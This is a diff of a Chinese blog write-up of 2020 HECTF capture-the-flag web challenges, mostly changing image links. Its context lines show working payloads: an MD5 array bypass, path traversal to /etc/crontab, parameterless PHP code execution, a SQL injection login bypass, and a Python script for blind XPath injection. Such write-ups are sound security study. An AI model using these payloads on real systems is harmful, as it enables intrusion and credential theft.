@@ -1,5 +1,6 @@
 ---
 title: 2020 HECTF Write-up
+urlname: 2020-HECTF-Write-up
 date: 2020-11-22 22:00:00
 updated: 
 comments: false
@@ -20,7 +21,7 @@ permalink:
 还在更新，抢了到人生第一次大一点点比赛的一血
 
 
-![firstblood](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_675ccc87c3303a64948c8a555cf143c7.jpg)
+![img](2020 HECTF Write-up/1.png)
 
 ---
 
@@ -47,9 +48,9 @@ flag不在/flag中哦，你应该找找奇奇怪怪的文件名
 
 `$_POST['a'] !== $_POST['b'] && md5($_POST['a']) === md5($_POST['b'])`
 老MD5强类型比较，传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL=NULL的情况，绕过比较。
-即`./?a[]=1&b[]=a`
+即`a[]=1&b[]=a`
 
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_23e21c14aeb3b02c928e95d4b8830f1e.jpg)
+![image-20201129160030053](2020 HECTF Write-up/image-20201129160030053.png)
 
 访问./3b8cf4731c36d20776c76e20f9c774c7.php
 
@@ -70,6 +71,7 @@ file_put_contents($file,"");
 然后去扫目录，发现了/etc等目录，后来比赛方给了hint，`/etc/crontab`
 
 ``./../../../etc/crontab`访问得
+
 ```
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -104,9 +106,15 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 从data参数中匹配字母、数字、下划线，其实就是'\w+'，然后在匹配一个循环的'()'，将匹配的替换为NULL，判断剩下的是否只有';'。
 
 很明显无参数RCE，编写脚本，首先`print_r(getcwd());`
+
+![image-20201129160247187](2020 HECTF Write-up/image-20201129160247187.png)
+
 访问`/very_g00d_Y0u_got_it.php`得`/`，说明当前工作目录为根目录
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_023fb7a94c25056fb2425fcc1aaecac9.jpg)
+
+![image-20201129160318943](2020 HECTF Write-up/image-20201129160318943.png)
+
 然后`print_r(scandir(getcwd()));`扫一下目录
+
 ```
 Array
 (
@@ -141,10 +149,10 @@ Array
 )
 ```
 
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_a9d4fb88e307c4fd5a1f18f40496085e.jpg)
+![image-20201129160403000](2020 HECTF Write-up/image-20201129160403000.png)
 发现异常文件`Zmw0Z2dnZ2dnZ2dnZ2dnCg`，访问后得到了flag
 
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_233aaf5db02d434e69201cb09175d2bc.jpg)
+![image-20201129160434419](2020 HECTF Write-up/image-20201129160434419.png)
 最后base64一下发现`Zmw0Z2dnZ2dnZ2dnZ2dnCg`就是`fl4gggggggggggg`
 
 
@@ -176,16 +184,16 @@ print(response)
 题目链接：http://114.55.165.246:8082/
 
 题目提示为注入，进入界面为登陆框，第一时间想到SQL注入
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_b06fc720cc53319af91fc5a9d16aa88f.jpg)
+![image-20201129160533941](2020 HECTF Write-up/image-20201129160533941.png)
 
 输admin登陆一下
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_e5d0dbe29859c70bd59208024874c290.jpg)
+![image-20201129160554397](2020 HECTF Write-up/image-20201129160554397.png)
 
 是GET传参，sqlmap跑一下没有结果，万能密码`1'or 1=1`试一下成功
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_8c5cfc0c0ace6442123071fe06dcbb2e.jpg)
+![image-20201129160625642](2020 HECTF Write-up/image-20201129160625642.png)
 
 怀疑是XXE，尝试了一会发现不是。
-后来想到XPath注入
+后来想到XPath注入(傻了，报错里有...)
 
 XPath基础查询语句`//users/user[loginID/text()=’abc’ and password/text()=’test123’]`
 
@@ -243,11 +251,10 @@ result: admin
 
 ---
 
-
 写脚本开始跑
 首先判断根下节点数
 因为是GET传参，直接访问`http://114.55.165.246:8082/?username=1' or count(/*)=1 or '1'='1&password=1&submit=登录`
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_59ec55be6edbba00deaba9e38ca5e8d6.jpg)
+![image-20201129160726706](2020 HECTF Write-up/image-20201129160726706.png)
 
 这个结果应该是return 1，即根下有一个节点
 
@@ -266,6 +273,7 @@ s = "qwertyuiopasdfghjklzxcvbnm1234567890"
 result = []
 
 for j in range(1,10):
+    flag = 0
     for i in range(0, 36):
         payload = "1' or substring(name(/!XXXX!*[position()=1]),"
         payload += str(j)
@@ -279,8 +287,11 @@ for j in range(1,10):
         res = requests.get(url).content.decode("utf-8").split("</html>")[1]
         if (re.search("you",res)):
             result.append(s[i])
+            flag=1
             print(s[i] + "--------->" + res.replace("\r\n" , ""))
             break
+    if flag == 0:
+        break
 
 print(result)
 
@@ -288,15 +299,15 @@ print(result)
 
 ```
 结果爆出第一级为root
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_00aedc93654a33bee2e12228fd47f39c.jpg)
+![image-20201129161139719](2020 HECTF Write-up/image-20201129161139719.png)
 
 同理，修改第13行为`"1' or substring(name(/root/*[position()=1]),"`
 继续爆
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_d9d6c7dd34c55ce4ac4c4bf7cfd41870.jpg)
+![image-20201129161225253](2020 HECTF Write-up/image-20201129161225253.png)
 
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_1c8d45d84748c0e9e051960ae5aaad97.jpg)
+![image-20201129161255235](2020 HECTF Write-up/image-20201129161255235.png)
 
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_5faa142e73cad22c7b7bb46a3bf21d92.jpg)
+![image-20201129161318627](2020 HECTF Write-up/image-20201129161318627.png)
 
 最后爆出结构为/root/users/user[id]
 
@@ -341,14 +352,14 @@ print(result)
 
 ```
 爆username
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_ad6cd97a1c90b91184c522c2fa3f21b8.jpg)
+![image-20201129162416104](2020 HECTF Write-up/image-20201129162416104.png)
 果然是admin
 
 继续爆password
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_043bd76183bcb72eaa8b78f1a8ca23fa.jpg)
+![image-20201129161907953](2020 HECTF Write-up/image-20201129161907953.png)
 
 
 结果password=339db714647a1d66b85cd08442287841
 
 登录一下，获得flag
-![](http://err0r.top/wp-content/uploads/2020/11/wp_editor_md_746f811568a05eaea8109fe8b1ee9136.jpg)
+![image-20201129161946397](2020 HECTF Write-up/image-20201129161946397.png)
